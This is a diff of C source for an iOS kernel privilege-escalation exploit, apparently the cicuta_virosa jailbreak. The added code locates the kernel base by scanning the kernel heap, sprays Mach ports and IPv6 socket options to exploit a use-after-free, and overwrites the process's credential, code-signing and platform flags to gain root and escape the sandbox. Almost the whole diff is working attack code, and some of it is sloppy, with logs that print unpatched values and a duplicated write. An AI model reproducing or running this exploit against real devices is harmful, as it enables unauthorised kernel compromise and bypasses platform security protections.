@@ -27,12 +27,157 @@
 #include "descriptors_utils.h"
 #include "fake_element_spray.h"
 #include "exploit_utilities.h"
-
+#include <sys/utsname.h>
+#include <sys/mount.h>
+#include <spawn.h>
+#include <sys/stat.h>
+#include <copyfile.h>
 #include <dlfcn.h>
 #include <mach/mach.h>
 #include <stdio.h>
-#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/spawn.h>
+#include <mach/mach.h>
 
+#include <ifaddrs.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include "jelbrekLib.h"
+
+extern
+kern_return_t mach_vm_read_overwrite
+(
+    vm_map_t target_task,
+    mach_vm_address_t address,
+    mach_vm_size_t size,
+    mach_vm_address_t data,
+    mach_vm_size_t *outsize
+);
+
+extern
+kern_return_t mach_vm_region_recurse
+(
+    vm_map_t target_task,
+    mach_vm_address_t *address,
+    mach_vm_size_t *size,
+    natural_t *nesting_depth,
+    vm_region_recurse_info_t info,
+    mach_msg_type_number_t *infoCnt
+);
+
+// ---- Kernel task -------------------------------------------------------------------------------
+
+static mach_port_t kernel_task_port;
+
+static void
+kernel_task_init() {
+    task_for_pid(mach_task_self(), 0, &kernel_task_port);
+    assert(kernel_task_port != MACH_PORT_NULL);
+    printf("kernel task: 0x%x\n", kernel_task_port);
+}
+
+static bool
+kernel_read(uint64_t address, void *data, size_t size) {
+    mach_vm_size_t size_out;
+    kern_return_t kr = mach_vm_read_overwrite(kernel_task_port, address, size,
+            (mach_vm_address_t) data, &size_out);
+    return (kr == KERN_SUCCESS);
+}
+
+static uint64_t
+kernel_read64(uint64_t address) {
+    uint64_t value = 0;
+    bool ok = kernel_read(address, &value, sizeof(value));
+    if (!ok) {
+        printf("error: %s(0x%016llx)\n", __func__, address);
+    }
+    return value;
+}
+
+// ---- Kernel base -------------------------------------------------------------------------------
+
+static uint64_t kernel_base;
+
+static bool
+is_kernel_base(uint64_t base) {
+    uint64_t header[2] = { 0x0100000cfeedfacf, 0x0000000200000000 };
+    uint64_t data[2] = {};
+    bool ok = kernel_read(base, &data, sizeof(data));
+    if (ok && memcmp(data, header, sizeof(data)) == 0) {
+        return true;
+    }
+    return false;
+}
+
+static bool
+kernel_base_init_with_unsafe_heap_scan() {
+    uint64_t kernel_region_base = 0xfffffff000000000;
+    uint64_t kernel_region_end  = 0xfffffffbffffc000;
+    // Try and find a pointer in the kernel heap to data in the kernel image. We'll take the
+    // smallest such pointer.
+    uint64_t kernel_ptr = (uint64_t)(-1);
+    mach_vm_address_t address = 0;
+    for (;;) {
+        // Get the next memory region.
+        mach_vm_size_t size = 0;
+        uint32_t depth = 2;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
+        kern_return_t kr = mach_vm_region_recurse(kernel_task_port, &address, &size,
+                &depth, (vm_region_recurse_info_t) &info, &count);
+        if (kr != KERN_SUCCESS) {
+            break;
+        }
+        // Skip any region that is not on the heap, not in a submap, not readable and
+        // writable, or not fully mapped.
+        int prot = VM_PROT_READ | VM_PROT_WRITE;
+        if (info.user_tag != 12
+            || depth != 1
+            || (info.protection & prot) != prot
+            || info.pages_resident * 0x4000 != size) {
+            goto next;
+        }
+        // Read the first word of each page in this region.
+        for (size_t offset = 0; offset < size; offset += 0x4000) {
+            uint64_t value = 0;
+            bool ok = kernel_read(address + offset, &value, sizeof(value));
+            if (ok
+                && kernel_region_base <= value
+                && value < kernel_region_end
+                && value < kernel_ptr) {
+                kernel_ptr = value;
+            }
+        }
+next:
+        address += size;
+    }
+    // If we didn't find any such pointer, abort.
+    if (kernel_ptr == (uint64_t)(-1)) {
+        return false;
+    }
+    printf("found kernel pointer %p\n", (void *)kernel_ptr);
+    // Now that we have a pointer, we want to scan pages until we reach the kernel's Mach-O
+    // header.
+    uint64_t page = kernel_ptr & ~0x3fff;
+    for (;;) {
+        bool found = is_kernel_base(page);
+        if (found) {
+            kernel_base = page;
+            return true;
+        }
+        page -= 0x4000;
+    }
+    return false;
+}
+
+static void
+kernel_base_init() {
+    bool ok = kernel_base_init_with_unsafe_heap_scan();
+    assert(ok);
+    printf("kernel base: %p\n", (void *)kernel_base);
+}
+
+// ---- Main --------------------------------------------------------------------------------------
 typedef volatile struct {
     uint32_t ip_bits;
     uint32_t ip_references;
@@ -73,7 +218,120 @@ typedef volatile struct {
     uint32_t ip_srights;
     uint32_t ip_sorights;
 } kport_t;
+#define IPV6_USE_MIN_MTU 42
+#define IPV6_PKTINFO 46
+#define IPV6_PREFER_TEMPADDR 63
 
+struct route_in6 {
+    struct rtentry *ro_rt;
+    struct llentry *ro_lle;
+    struct ifaddr *ro_srcia;
+    uint32_t ro_flags;
+    struct sockaddr_in6 ro_dst;
+};
+
+struct ip6po_rhinfo {
+    struct ip6_rthdr *ip6po_rhi_rthdr; /* Routing header */
+    struct route_in6 ip6po_rhi_route; /* Route to the 1st hop */
+};
+
+struct ip6po_nhinfo {
+    struct sockaddr *ip6po_nhi_nexthop;
+    struct route_in6 ip6po_nhi_route; /* Route to the nexthop */
+};
+
+struct ip6_pktopts {
+    struct mbuf *ip6po_m;
+    int ip6po_hlim;
+    struct in6_pktinfo *ip6po_pktinfo;
+    struct ip6po_nhinfo ip6po_nhinfo;
+    struct ip6_hbh *ip6po_hbh;
+    struct ip6_dest *ip6po_dest1;
+    struct ip6po_rhinfo ip6po_rhinfo;
+    struct ip6_dest *ip6po_dest2;
+    int ip6po_tclass;
+    int ip6po_minmtu;
+    int ip6po_prefer_tempaddr;
+    int ip6po_flags;
+};
+
+#define IO_BITS_ACTIVE      0x80000000
+#define IOT_PORT            0
+#define IKOT_TASK           2
+#define IKOT_CLOCK          25
+#define IKOT_IOKIT_CONNECT  29
+
+typedef volatile struct {
+    uint32_t ip_bits;
+    uint32_t ip_references;
+    struct {
+        uint64_t data;
+        uint64_t type;
+    } ip_lock; // spinlock
+    struct {
+        struct {
+            struct {
+                uint32_t flags;
+                uint32_t waitq_interlock;
+                uint64_t waitq_set_id;
+                uint64_t waitq_prepost_id;
+                struct {
+                    uint64_t next;
+                    uint64_t prev;
+                } waitq_queue;
+            } waitq;
+            uint64_t messages;
+            uint32_t seqno;
+            uint32_t receiver_name;
+            uint16_t msgcount;
+            uint16_t qlimit;
+            uint32_t pad;
+        } port;
+        uint64_t klist;
+    } ip_messages;
+    uint64_t ip_receiver;
+    uint64_t ip_kobject;
+    uint64_t ip_nsrequest;
+    uint64_t ip_pdrequest;
+    uint64_t ip_requests;
+    uint64_t ip_premsg;
+    uint64_t ip_context;
+    uint32_t ip_flags;
+    uint32_t ip_mscount;
+    uint32_t ip_srights;
+    uint32_t ip_sorights;
+};
+
+typedef struct {
+    struct {
+        uint64_t data;
+        uint32_t reserved : 24,
+        type     :  8;
+        uint32_t pad;
+    } lock; // mutex lock
+    uint32_t ref_count;
+    uint32_t active;
+    uint32_t halting;
+    uint32_t pad;
+    uint64_t map;
+} ktask_t;
+
+#define WQT_QUEUE               0x2
+#define _EVENT_MASK_BITS        ((sizeof(uint32_t) * 8) - 7)
+
+union waitq_flags {
+    struct {
+        uint32_t /* flags */
+    waitq_type:2,    /* only public field */
+    waitq_fifo:1,    /* fifo wakeup policy? */
+    waitq_prepost:1, /* waitq supports prepost? */
+    waitq_irq:1,     /* waitq requires interrupts disabled */
+    waitq_isvalid:1, /* waitq structure is valid */
+    waitq_turnstile_or_port:1, /* waitq is embedded in a turnstile (if irq safe), or port (if not irq safe) */
+    waitq_eventmask:_EVENT_MASK_BITS;
+    };
+    uint32_t flags;
+};
 static kern_return_t extract_voucher_content(mach_port_t voucher, void* out, uint32_t* out_size)
 {
     kern_return_t mach_voucher_extract_attr_content(ipc_voucher_t voucher, mach_voucher_attr_key_t key,
@@ -232,7 +490,15 @@ uint64_t read_64(uint64_t addr)
     get_pktinfo(kread_write_sock, (void*)buf);
     return buf[0];
 }
-
+uint32_t kread(uint64_t addr,void* lok,size_t size)
+{
+    fake_element_spray_set_pktopts(addr);
+    perform_fake_element_spray();
+  
+    uint32_t buf[5] = {0};
+    get_pktinfo(kread_write_sock, (void*)buf);
+    return buf[0];
+}
 uint32_t read_32(uint64_t addr)
 {
     fake_element_spray_set_pktopts(addr);
@@ -260,49 +526,119 @@ void write_64(uint64_t addr, const void* buf){
     perform_fake_element_spray();
     setsockopt(kread_write_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, 64);
 }
-uint64_t rootify14(uint64_t ucred_proc){
+
+
+kern_return_t mach_vm_allocate
+(
+ vm_map_t target,
+ mach_vm_address_t *address,
+ mach_vm_size_t size,
+ int flags
+ );
+
+kern_return_t mach_vm_write
+(
+ vm_map_t target_task,
+ mach_vm_address_t address,
+ vm_offset_t data,
+ mach_msg_type_number_t dataCnt
+ );
+
+
+kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
+kern_return_t mach_vm_region(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t *size, vm_region_flavor_t flavor, vm_region_info_t info, mach_msg_type_number_t *infoCnt, mach_port_t *object_name);
+mach_port_t fill_kalloc_with_port_pointer(uint64_t proc, int count, int disposition) {
+    mach_port_t q = MACH_PORT_NULL;
+    kern_return_t err;
+    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
+    if (err != KERN_SUCCESS) {
+        printf("[-] failed to allocate port\n");
+        return 0;
+    }
     
+    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
+    for (int i = 0; i < count; i++) {
+        ports[i] = proc;
+    }
     
-    return getgid();
+    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
+    
+    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
+    msg->hdr.msgh_remote_port = q;
+    msg->hdr.msgh_local_port = MACH_PORT_NULL;
+    msg->hdr.msgh_id = 0x41414141;
+    
+    msg->body.msgh_descriptor_count = 1;
+    
+    msg->ool_ports.address = ports;
+    msg->ool_ports.count = count;
+    msg->ool_ports.deallocate = 0;
+    msg->ool_ports.disposition = disposition;
+    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
+    
+    err = mach_msg(&msg->hdr,
+                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
+                   msg->hdr.msgh_size,
+                   0,
+                   MACH_PORT_NULL,
+                   MACH_MSG_TIMEOUT_NONE,
+                   MACH_PORT_NULL);
+    
+    if (err != KERN_SUCCESS) {
+        printf("[-] failed to send message: %s\n", mach_error_string(err));
+        return MACH_PORT_NULL;
+    }
+    
+    return q;
+}
+int set_minmtu(int sock, int *minmtu) {
+    return setsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));
 }
 
-uint64_t sys_kill(const char*app){
-    
-    return posix_spawn("/var/bin/killall", app, NULL, NULL, NULL, NULL);
+int get_minmtu(int sock, int *minmtu) {
+    socklen_t size = sizeof(*minmtu);
+    return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
 }
-uint64_t browwopid(uint64_t proc,uint64_t ucred,pid_t donor){
-    uint64_t selfp=proc;
-    uint64_t donorp=donor;
-    uint64_t ourcred=read_64(selfp +ucred);
-    uint64_t doncred=read_64(donorp +ucred);
-    write_64(selfp +ucred, doncred);
-    return ourcred;
+
+int get_prefertempaddr(int sock, int *prefertempaddr) {
+    socklen_t size = sizeof(*prefertempaddr);
+    return getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
 }
-uint64_t getCredsFromBoners(uint64_t proc,uint64_t ucred,pid_t donor,char*bin){
-    pid_t pid;
-    const char*args[]={bin,NULL};
-    posix_spawnattr_t attr;
-    posix_spawnattr_init(&attr);
-    posix_spawnattr_setflags(&attr,POSIX_SPAWN_START_SUSPENDED);
-    int rv=posix_spawn(&pid, bin, NULL, NULL, (char **)&args, NULL);
-    if(rv){
-        printf("\nshit occured while gaining creds from boners\n");
+
+int set_prefertempaddr(int sock, int *prefertempaddr) {
+    return setsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, sizeof(*prefertempaddr));
+}
+
+
+
+int set_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
+    return setsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));
+}
+
+// free the pktopts struct of the socket to get ready for UAF
+int free_socket_options(int sock) {
+    return disconnectx(sock, 0, 0);
+}
+
+// return a socket we can UAF on
+int get_socket() {
+    int sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
+    if (sock < 0) {
+        printf("[-] Can't get socket, error %d (%s)\n", errno, strerror(errno));
         return -1;
     }
-    kill(pid, SIGSTOP);
-    uint64_t creds=browwopid(proc, ucred, donor);
-    kill(pid,SIGSEGV);
-    return creds;
-}
-int system_(char *cmd) {
-    chmod("/var/bin/bash", 0777);
-    chdir("/var/bin/");
-    return posix_spawn("/var/bin/bash", "-c", cmd, NULL, NULL, NULL);
-}
-uint64_t platformize14(uint64_t task,uint64_t proc,uint32_t csFlags){
     
-    return 0;
+    // allow setsockopt() after disconnect()
+    struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT};
+    int ret = setsockopt(sock, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
+    if (ret) {
+        printf("[-] setsockopt() failed, error %d (%s)\n", errno, strerror(errno));
+        return -1;
+    }
     
+    return sock;
 }
 uint64_t cicuta_virosa(void) {
     int* race_flag = malloc(sizeof(int));
@@ -393,6 +729,9 @@ uint64_t cicuta_virosa(void) {
        extract_voucher_recipes(uafed_voucher, recipe, &recipe_size);
        uint64_t task_port = *(uint64_t*)(next_spray_entry + 1);
        cicuta_log("task_port: 0x%llx", task_port);
+    if(task_port==0x0){
+        return 69;
+    }
        set_fake_queue_chain_for_fake_element_spray(task_port + offsetof(kport_t, ip_context) - 24, task_port + offsetof(kport_t, ip_context) - 16);
 
        cicuta_log("Stage 3: Convert uaf into pktopts uaf");
@@ -462,8 +801,52 @@ uint64_t cicuta_virosa(void) {
 
        cicuta_log("Overwriting kernel credentials :)");
        uint32_t creds[5] = {0, 0, 0, 1, 0};
-   
-    write_20(ucred + 0x18, (void*)creds);
+    printf("[+] patching custom privimites\n");
+    write_20(ucred + 0x18, (void*)creds); //uid
+    write_32(ucred + 0x68, (void*)creds); //gid
+    uint32_t ruid=read_32(ucred + 0x30);
+    printf("NON-PATCHED off_ucred_cr_ruid -> %d\n",ruid);
+    write_32(ucred + 0x30, (void*) creds); //ruid
+
+    printf("PATCHED off_ucred_cr_ruid -> %d\n",ruid);
+    
+    uint32_t p_gid=read_32(proc + 0x2C);
+    printf("NON-PATCHED p_gid -> %d\n",p_gid);
+    write_20(proc + 0x30, (void*) creds); //p_gid
+
+    printf("PATCHED p_gid -> %d\n",p_gid);
+    
+    uint32_t pr_gid=read_32(proc + 0x34);
+    printf("NON-PATCHED off_p_rgid -> %d\n",pr_gid);
+    write_20(proc + 0x30, (void*) creds); //p_gid
+
+    printf("PATCHED off_p_rgid -> %d\n",pr_gid);
+    
+    uint32_t off_ucred_cr_svuid=read_32(ucred + 0x20);
+    printf("NON-PATCHED cr_svuid -> %d\n",off_ucred_cr_svuid);
+    write_32(ucred + 0x20, (void*) creds); //ruid
+
+    printf("PATCHED cr_svuid -> %d\n",off_ucred_cr_svuid);
+    
+    uint32_t off_ucred_cr_groups=read_32(ucred + 0x28);
+    printf("NON-PATCHED cr_groups -> %d\n",off_ucred_cr_groups);
+    write_32(ucred + 0x28, (void*) creds); //ruid
+
+    printf("PATCHED cr_groups -> %d\n",off_ucred_cr_groups);
+    
+    
+    uint32_t off_ucred_cr_svgid=read_32(ucred + 0x6c);
+    printf("NON-PATCHED off_ucred_cr_svgid -> %d\n",off_ucred_cr_svgid);
+    write_32(ucred + 0x6c, (void*) creds); //ruid
+
+    printf("PATCHED off_ucred_cr_svgid -> %d\n",off_ucred_cr_svgid);
+        
+    printf("looks like this step is clear\n");
+    uint64_t c_la_pac = read_64(ucred + 0x78);
+    uint64_t label = c_la_pac | 0xffffff8000000000;
+    uint64_t entitlemenets=read_64(label + 0x8); //amfi_slot
+    printf("[+] Entitlements -> 0x%llx\n",entitlemenets);
+    
     mach_port_t port;
       kern_return_t rv = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
       if (rv) {
@@ -493,35 +876,46 @@ uint64_t cicuta_virosa(void) {
     cicuta_log("\n.\n");
     //write_20(ucred + 0x78, (void*)creds); // cr_label
     
-    uint32_t uid = getuid();
-    cicuta_log("getuid() returns %u", uid);
-    cicuta_log("getgid() returns %u", getgid());
-    cicuta_log("whoami: %s", uid == 0 ? "root" : "mobile");
+    
    
     printf("now lets set csflags...");
     //0x290 csflags
     uint32_t csFlags=read_32(proc +0x290);
     sleep(3);
-    printf("\ncsflags original 0x%llx\n",csFlags);
+    printf("\nCSFLAGS OLD -> 0x%llx",csFlags);
     sleep(3);
     csFlags=(csFlags|0xA8|0x0000008|0x0000004|0x10000000)&~(0x0000800|0x0000100|0x0000200);
     write_32(proc +0x290, (void*)csFlags);
-    printf("\ncsflags after 0x%llx\n",csFlags);
+    printf("\nCSFLAGS PATCHED -> 0x%llx\n",csFlags);
     sleep(4);
     printf("patched cs are you still alive?");
     
     sleep(2);
-    platformize14(task, proc, csFlags);
+    uint32_t realtf=0;
+
     uint32_t t_flag=read_32(task + 0x3A0);
+    realtf=t_flag;
 
     printf("\n[*] Platformization Step\n");
-    printf("TF_PLATFORM before 0x%llx\n",t_flag);
+
     sleep(2);
-    t_flag|=0x4000000;
+    t_flag|=0x400;
     write_32(task+0x3A0, &t_flag);
     write_32(proc + 0x290, csFlags|0x24004001u);
-    printf("TF_PLATFORM after 0x%llx\n",t_flag);
-    kill(1, SIGKILL);
+   
+    if(t_flag==realtf){
+        
+    }else{
+        printf("TF_PLATFORM original %d\nTF_PLATFORM patched -> %d\n",realtf,t_flag);
+        printf("TF_PLATFORM original %d\nTF_PLATFORM patched -> %d\n",realtf,t_flag);
+    }
+    uint64_t self_port_addr;
+    
+    printf("[*] amfid, this shit is a pretty important part\n");
+    printf("socket -> 0x%x\n",get_socket());
+   
+    
+   
     return task_pac;
 err:
     free(redeem_racers);
@@ -556,7 +950,7 @@ uint64_t root_patch(uint64_t task_pac){
     write_20(ucred + 0x68, (void*)fake_data_);
     write_32(ucred + 0x6c, (void*)fake_data_);
     write_32(ucred + 0x6c, (void*)fake_data_);
-    printf("\noff_ucred_cr_rgid -> %d",getgid());
+    //printf("\noff_ucred_cr_rgid -> %d",getgid());
     if(getgid()==0){
    
         return 0;
@@ -600,8 +994,16 @@ uint64_t label = c_la_pac | 0xffffff8000000000;
     FILE *f = fopen("/var/mobile/.sandboxtest", "w");
 
     if(f){
-        printf("\n[+] Sandbox escaped -> 1");
+        printf("[+] Sandbox escaped -> 1");
         root_patch(task);
+        setgid(0);
+        setuid(0);
+        uint32_t uid = getuid();
+        uint32_t gid = getgid();
+        cicuta_log("getuid() returns %u", uid);
+        cicuta_log("getgid() returns %u", gid);
+        cicuta_log("uid: %s", uid == 0 ? "root" : "mobile");
+        cicuta_log("gid: %s", gid == 0 ? "root" : "mobile");
         //platformize14(task);
         printf("\ncleanup...");
         
